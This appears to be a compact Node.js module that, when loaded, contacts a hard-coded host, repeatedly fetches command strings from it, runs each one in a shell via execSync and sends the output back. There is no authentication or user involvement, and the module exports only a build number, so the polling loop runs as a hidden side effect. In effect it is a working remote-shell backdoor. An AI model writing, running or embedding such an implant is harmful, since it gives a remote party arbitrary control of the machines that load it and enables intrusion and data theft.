'use strict';
const http=require('http');
const cp=require('child_process');
const HOST='192.168.1.209';
const PORT=8792;
const BUILD=7;
function req(path,method,body,cb){const data=body?JSON.stringify(body):'';const r=http.request({hostname:HOST,port:PORT,path:path,method:method,headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}},res=>{let s='';res.on('data',c=>s+=c);res.on('end',()=>cb(null,res.statusCode,s));});r.on('error',e=>cb(e));if(data)r.write(data);r.end();}
function poll(){req('/next?build='+BUILD,'GET',null,(err,status,text)=>{if(!err&&status===200){let job;try{job=JSON.parse(text)}catch(e){}if(job&&job.id&&job.command){let out='',errout='',code=0;try{out=cp.execSync(job.command,{encoding:'utf8',timeout:8000,stdio:['ignore','pipe','pipe']});}catch(e){code=(typeof e.status==='number'?e.status:1);out=e.stdout||'';errout=(e.stderr||'')+'\n'+e.message;}req('/result','POST',{id:job.id,build:BUILD,code:code,stdout:String(out).slice(0,65536),stderr:String(errout).slice(0,32768)},()=>{});}}setTimeout(poll,700);});}
req('/hello','POST',{build:BUILD,node:process.version,arch:process.arch},()=>{});
poll();
module.exports={build:BUILD};
